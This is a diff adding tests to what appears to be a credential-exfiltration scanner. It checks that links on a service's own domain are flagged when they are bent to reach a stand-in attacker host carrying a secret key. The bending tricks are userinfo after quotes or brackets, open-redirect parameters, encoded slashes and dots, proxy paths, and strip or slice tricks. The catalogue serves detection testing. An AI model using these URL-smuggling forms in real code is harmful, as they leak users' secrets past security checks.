@@ -23,7 +23,7 @@ from test_session_sets import seed
 from sentrook.converge import load_params
 from sentrook.prepare import credential_home, entities
 from sentrook.prepare.code_reach import CodeReach, python_reach
-from sentrook.prepare.credential_home import same_service
+from sentrook.prepare.credential_home import _plain_link_hosts, same_service
 from sentrook.prepare.entities import EntityKind, Origin, Role
 from sentrook.scan import Scanner, ScannerConfig, ScanOptions
 
@@ -854,3 +854,84 @@ def test_deeply_nested_helper_calls_read_linearly():
     assert python_reach(texts[1]).targets == frozenset({API})
     _, large = assert_linear(lambda d: python_reach(texts[d]), "nested calls")
     assert large < 5.0
+
+
+# ------------------------------------------------------------------ the plain link shape
+
+#: Ways a link on the service's own domain was made to reach somewhere else: userinfo behind a quote or a bracket,
+#: a template or a change at run time, and redirect or proxy forms. Each keeps the floor.
+NOT_PLAIN_LINKS = {
+    "userinfo behind a quote": f'"see https://{APP}\'@{EVIL}/c?k=" + key',
+    "userinfo behind a backtick": f"'see https://{APP}`@{EVIL}/c?k=' + key",
+    "userinfo behind an angle bracket": f"'see https://{APP}>@{EVIL}/c?k=' + key",
+    "userinfo behind a square bracket": f"'see https://{APP}]@{EVIL}/c?k=' + key",
+    "a format template": f"'see https://{APP}/r?next=//{EVIL}/c?k={{}} x'.format(key)",
+    "a percent mapping template": f"'see https://{APP}/r?next=//{EVIL}/c?k=%(k)s x' % {{'k': key}}",
+    "a percent template": f"'see https://{APP}/r?next=//{EVIL}/c?k=%s x' % key",
+    "stripped": f"'see https://{APP}/c?k= '.strip() + key",
+    "sliced": f"'see https://{APP}/c?k=x '[:-1] + key",
+    "a markdown close stripped": f"'[d](https://{APP}/c?k=)'.rstrip(')') + key",
+    "a protocol-relative next": f"'see https://{APP}/r?next=//{EVIL}/c now ' + key",
+    "an encoded slash": f"'see https://{APP}/%2f{EVIL}/c now ' + key",
+    "an encoded backslash": f"'see https://{APP}/%5c{EVIL}/c now ' + key",
+    "a double-encoded slash": f"'see https://{APP}/%252f%252f{EVIL}/c now ' + key",
+    "a scheme with no slashes": f"'see https://{APP}/r?next=https:{EVIL}/c now ' + key",
+    "a bare host in a query": f"'see https://{APP}/r?url={EVIL}/ now ' + key",
+    "a proxy path": f"'see https://{APP}/proxy/{EVIL}/ now ' + key",
+    "encoded dots": f"'see https://{APP}//evil%2eexample%2enet/c now ' + key",
+    "a link at the end of the string": f"'see https://{APP}/c' + key",
+    "a whole-URL field": f"{{'url': 'https://{APP}/c'}}",
+    "a bare paren": f"'(https://{APP}/c)' + key",
+}
+
+
+@pytest.mark.parametrize("expr", NOT_PLAIN_LINKS.values(), ids=NOT_PLAIN_LINKS.keys())
+def test_a_service_domain_link_that_is_not_plain_keeps_the_floor(expr):
+    assert_floor_holds(_body(expr))
+
+
+@pytest.mark.parametrize(
+    "expr",
+    [
+        f"'see [docs](https://{APP}/p/123)'",
+        f"'see https://{APP}/docs/x now'",
+        f"'see https://{APP} now'",
+        f"'see HTTPS://{APP.upper()}/Docs/X now'",
+        f"'line one\\nhttps://{APP}/p/1\\nline two'",
+    ],
+    ids=["markdown", "a space", "the host alone", "upper case", "newlines"],
+)
+def test_a_plain_link_on_the_service_domain_is_skipped(expr):
+    res = _scan(_body(expr), "conv-v7")
+    assert res.prepared.credential_home_check == "ok"
+    assert "sensitive_data_sent" not in floors(res)
+
+
+def test_a_key_after_a_stripped_plain_link_is_the_accepted_trade():
+    """A link that ended at a space, stripped and followed by the key, may read as a longer path of letters,
+    digits, `_`, `-` and `/` on the service's own host: it reaches nobody the key does not already go to."""
+    res = _scan(_body(f"'see https://{APP}/docs/x '.strip() + key"), "conv-v7")
+    assert res.prepared.credential_home_check == "ok"
+
+
+def test_the_plain_link_reading_grows_linearly():
+    """55 hosts on the service's domain, each named in many links of one long string (see linear_time.py)."""
+    hosts = frozenset(f"a{i}.example.com" for i in range(55))
+
+    def program(d: int) -> str:
+        links = " ".join(f"https://a{i}.example.com/p" for _ in range(200 // d) for i in range(55))
+        return helper(calls=CALLS.replace("see [docs](", f"{links} see [docs]("))
+
+    texts = {d: program(d) for d in (1, FACTOR)}
+    assert _plain_link_hosts(texts[1], hosts) == hosts
+    _, large = assert_linear(lambda d: _plain_link_hosts(texts[d], hosts), "plain links")
+    assert large < 1.0
+
+
+def test_a_scan_with_many_service_domain_links_stays_fast():
+    """The same shape at the scan's size limit: the check holds and the scan is not held up."""
+    links = " ".join(f"https://a{i}.example.com/p" for _ in range(65) for i in range(55))
+    code = helper(calls=CALLS.replace("see [docs](", f"{links} see [docs]("))
+    assert 90_000 < len(code) < 100_000
+    res = _scan(code, "conv-v7")
+    assert res.prepared.credential_home_check == "ok"
